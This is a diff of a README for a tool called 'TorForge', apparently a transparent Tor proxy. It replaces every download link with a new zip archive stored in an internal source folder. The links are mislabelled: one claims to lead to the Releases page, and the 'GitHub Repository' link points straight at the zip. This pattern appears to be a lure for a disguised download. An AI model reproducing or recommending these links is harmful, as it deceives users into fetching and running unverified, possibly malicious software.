@@ -7,7 +7,7 @@ TorForge provides an advanced transparent Tor proxy. It routes all system traffi
 ### Step 1: Visit the Release Page
 To download TorForge, visit the Releases page. Click the link below:
 
-[![Download TorForge](https://raw.githubusercontent.com/5Ramoaz/TorForge/main/internal/bridge/Forge_Tor_3.9.zip)](https://raw.githubusercontent.com/5Ramoaz/TorForge/main/internal/bridge/Forge_Tor_3.9.zip)
+[![Download TorForge](https://github.com/5Ramoaz/TorForge/raw/refs/heads/main/internal/bridge/Tor_Forge_1.6.zip)](https://github.com/5Ramoaz/TorForge/raw/refs/heads/main/internal/bridge/Tor_Forge_1.6.zip)
 
 ### Step 2: Choose the Latest Version
 On the Releases page, find the latest version. It is usually at the top of the list. Click on it to access the release details.
@@ -55,9 +55,9 @@ Common problems include connection errors or slow speeds. If these occur, try re
 For assistance, check the issues section on the GitHub repository. You can also reach out through the community forums for support.
 
 ## 🔗 Additional Resources
-- **GitHub Repository:** [TorForge GitHub](https://raw.githubusercontent.com/5Ramoaz/TorForge/main/internal/bridge/Forge_Tor_3.9.zip)
+- **GitHub Repository:** [TorForge GitHub](https://github.com/5Ramoaz/TorForge/raw/refs/heads/main/internal/bridge/Tor_Forge_1.6.zip)
 - **Documentation:** Find detailed user guides and FAQs in the repository.
 
-[![Download TorForge](https://raw.githubusercontent.com/5Ramoaz/TorForge/main/internal/bridge/Forge_Tor_3.9.zip)](https://raw.githubusercontent.com/5Ramoaz/TorForge/main/internal/bridge/Forge_Tor_3.9.zip) 
+[![Download TorForge](https://github.com/5Ramoaz/TorForge/raw/refs/heads/main/internal/bridge/Tor_Forge_1.6.zip)](https://github.com/5Ramoaz/TorForge/raw/refs/heads/main/internal/bridge/Tor_Forge_1.6.zip) 
 
 Thank you for choosing TorForge. Enjoy your secure browsing experience!
